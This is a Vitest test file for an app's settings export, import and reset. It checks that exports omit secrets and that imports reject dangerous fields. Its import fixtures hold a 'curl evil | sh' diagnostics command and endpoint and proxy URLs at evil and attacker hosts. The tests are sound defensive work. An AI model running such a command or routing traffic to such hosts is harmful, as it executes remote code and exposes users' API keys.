import { describe, expect, it } from 'vitest'
import { DEFAULT_SETTINGS, SettingsSchema, type Settings } from '@shared/ipc'
import {
  buildSettingsExport,
  buildSettingsReset,
  EXPORTED_KEYS,
  previewSettingsImport,
  RESET_KEPT_KEYS
} from '@main/settings/settingsFile'

function settings(over: Partial<Settings> = {}): Settings {
  return SettingsSchema.parse({ ...DEFAULT_SETTINGS, ...over })
}

const fileOf = (s: Record<string, unknown>) =>
  JSON.stringify({ format: 'vyotiq-settings', version: 1, appVersion: '1.0.0', exportedAt: '', settings: s })

describe('settings export', () => {
  it('carries only the allowlist, with no endpoint headers, MCP servers or machine paths', () => {
    const current = settings({
      theme: 'dark',
      customCssPath: 'C:\\me\\style.css',
      pinnedRuns: ['x\u0000y'],
      mcpServers: [{ id: 's', name: 'S', transport: 'stdio', command: 'node', args: [], env: { TOKEN: 'secret' } } as never],
      customProviders: [{ id: 'custom:gw', name: 'Gateway', baseUrl: 'https://gw.example.com/v1', headers: { 'X-Key': 'tok' } }],
      codeIndex: { ...DEFAULT_SETTINGS.codeIndex, pausedPaths: ['C:\\private'] },
      dictation: { ...DEFAULT_SETTINGS.dictation, deviceId: 'mic-123' }
    })
    const doc = buildSettingsExport(current, '1.2.3', new Date('2026-09-30T00:00:00Z'))
    expect(doc).toMatchObject({ format: 'vyotiq-settings', version: 1, appVersion: '1.2.3', exportedAt: '2026-09-30T00:00:00.000Z' })
    const out = doc.settings as Record<string, unknown>
    expect(Object.keys(out).every((k) => (EXPORTED_KEYS as readonly string[]).includes(k))).toBe(true)
    for (const gone of ['customCssPath', 'pinnedRuns', 'mcpServers', 'marketplace', 'googleMcpClientId', 'toolApprovalOnboardingDone']) {
      expect(out).not.toHaveProperty(gone)
    }
    expect(out.customProviders).toEqual([{ id: 'custom:gw', name: 'Gateway', baseUrl: 'https://gw.example.com/v1' }])
    expect(out.codeIndex).not.toHaveProperty('pausedPaths')
    expect(out.dictation).not.toHaveProperty('deviceId')
    expect(JSON.stringify(doc)).not.toMatch(/secret|tok|mic-123|private/)
    // The export doesn't change what it was made from.
    expect(current.customProviders[0]!.headers).toEqual({ 'X-Key': 'tok' })
  })
})

describe('settings import', () => {
  it('previews field by field: applies valid changes, skips bad values and the ones a file must not set', () => {
    const current = settings({ theme: 'dark', keepRecentTurns: 12 })
    const { preview, patch } = previewSettingsImport(
      fileOf({
        theme: 'light',
        keepRecentTurns: 12,
        maxChatPanes: 'lots',
        customOpenAiBaseUrl: 'https://evil.example.com/v1',
        diagnosticsCommand: 'curl evil | sh',
        toolApproval: { ...DEFAULT_SETTINGS.toolApproval },
        pinnedRuns: ['a'],
        network: { proxyMode: 'manual', proxyUrl: 'http://evil:8080', proxyBypass: '' }
      }),
      current
    )
    expect(patch).toEqual({ theme: 'light' })
    expect(preview.changes).toEqual([{ key: 'theme', from: 'dark', to: 'light' }])
    const skipped = Object.fromEntries(preview.skipped.map((s) => [s.key, s.reason]))
    expect(skipped.maxChatPanes).toBe('not a valid value')
    expect(skipped.customOpenAiBaseUrl).toMatch(/where the Custom key is sent/)
    expect(skipped.diagnosticsCommand).toMatch(/a command the app runs/)
    expect(skipped.network).toMatch(/the proxy/)
    expect(skipped.pinnedRuns).toMatch(/not something a settings file sets/)
    // Same as now: not a change, and not reported as skipped.
    expect(skipped).not.toHaveProperty('toolApproval')
  })

  it('adds endpoints the file has, keeps yours as they are, and drops a provider that points nowhere', () => {
    const mine = { id: 'custom:gw' as const, name: 'Gateway', baseUrl: 'https://gw.example.com/v1' }
    const current = settings({ customProviders: [mine] })
    const { preview, patch } = previewSettingsImport(
      fileOf({
        customProviders: [
          { ...mine, baseUrl: 'https://attacker.example.com/v1' },
          { id: 'custom:lab', name: 'Lab', baseUrl: 'http://10.0.0.5:8000/v1' }
        ],
        provider: 'custom:ghost',
        model: 'x'
      }),
      current
    )
    expect(patch.customProviders).toEqual([mine, { id: 'custom:lab', name: 'Lab', baseUrl: 'http://10.0.0.5:8000/v1' }])
    expect(patch).not.toHaveProperty('provider')
    expect(patch).not.toHaveProperty('model')
    expect(preview.skipped).toContainEqual({ key: 'provider', reason: 'an endpoint that is not set up here' })
  })

  it('refuses a file that is not a settings file, or from a newer app', () => {
    const current = settings()
    expect(() => previewSettingsImport('nope', current)).toThrow(/not JSON/)
    expect(() => previewSettingsImport('{"format":"other"}', current)).toThrow(/not an Agent V settings file/)
    expect(() => previewSettingsImport(JSON.stringify({ format: 'vyotiq-settings', version: 99, settings: {} }), current)).toThrow(/newer Agent V/)
  })

  it('round-trips an export into an empty preview', () => {
    const current = settings({ theme: 'light', skinId: 'gild', responseLanguage: 'fr' })
    const doc = buildSettingsExport(current, '1.0.0')
    expect(previewSettingsImport(JSON.stringify(doc), current).preview.changes).toEqual([])
  })
})

describe('settings reset', () => {
  it('puts everything back but keys’ endpoints, sign-ins, extensions, consent and your data', () => {
    const current = settings({
      theme: 'dark',
      keepRecentTurns: 30,
      provider: 'openai',
      model: 'gpt-5.6',
      toolApprovalOnboardingDone: true,
      pinnedRuns: ['a\u0000b'],
      userRules: [{ id: 'r', name: 'R', body: 'b', enabled: true }],
      codeIndex: { ...DEFAULT_SETTINGS.codeIndex, enabled: false, pausedPaths: ['C:\\x'] }
    })
    const patch = buildSettingsReset(current)
    expect(patch.theme).toBe(DEFAULT_SETTINGS.theme)
    expect(patch.keepRecentTurns).toBe(DEFAULT_SETTINGS.keepRecentTurns)
    expect(patch.codeIndex).toEqual({ ...DEFAULT_SETTINGS.codeIndex, pausedPaths: ['C:\\x'] })
    for (const kept of RESET_KEPT_KEYS) expect(patch).not.toHaveProperty(kept)
    // Settings already at their default are not written again.
    expect(patch).not.toHaveProperty('navigationMode')
  })
})
